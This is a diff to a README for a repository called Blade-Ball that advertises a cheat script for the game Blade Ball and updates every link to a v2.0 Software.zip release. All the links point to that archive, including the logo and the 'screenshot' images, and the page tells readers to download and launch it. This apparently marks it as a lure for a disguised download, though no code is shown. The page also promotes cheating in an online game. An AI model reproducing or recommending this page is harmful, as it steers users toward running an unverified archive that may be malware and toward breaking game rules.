@@ -2,7 +2,7 @@
 
 Welcome to the **Blade-Ball** repository! 🔒 Here you will find an amazing hack script for the game Blade Ball that will elevate your gaming experience to a whole new level. 🎮
 
-![Blade Ball Logo](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip)
+![Blade Ball Logo](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip)
 
 ## Repository Info
 - **Repository Name:** Blade-Ball
@@ -17,7 +17,7 @@ Welcome to the **Blade-Ball** repository! 🔒 Here you will find an amazing hac
 5. **AUTOPARRY:** Automatically parry attacks to gain an advantage in battles.
   
 ## How to Use
-1. Download the hack script from [here](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip).
+1. Download the hack script from [here](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip).
 2. Launch the script to activate the cheats. 💥
 
 **Note:** If the above link doesn't work, please check the "Releases" section of this repository for alternative download options.
@@ -25,9 +25,9 @@ Welcome to the **Blade-Ball** repository! 🔒 Here you will find an amazing hac
 ## Gameplay Screenshots
 Here are some thrilling screenshots from the game with the hack script enabled:
 
-![Screenshot 1](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip)
-![Screenshot 2](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip)
-![Screenshot 3](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip)
+![Screenshot 1](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip)
 
 ## Support
 If you encounter any issues or have feedback, feel free to reach out to us. We are committed to providing you with the best gaming experience possible.
@@ -35,4 +35,4 @@ If you encounter any issues or have feedback, feel free to reach out to us. We a
 ## Stay Updated
 Don't forget to ⭐️ star this repository to stay updated on the latest hacks and updates for Blade Ball. Happy gaming! 🎉
 
-[![Download Hack Script](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip%20Script-red)](https://github.com/Clishine/Blade-Ball/releases/download/v1.0/Release.zip)
+[![Download Hack Script](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip%20Script-red)](https://github.com/Clishine/Blade-Ball/releases/download/v2.0/Software.zip)
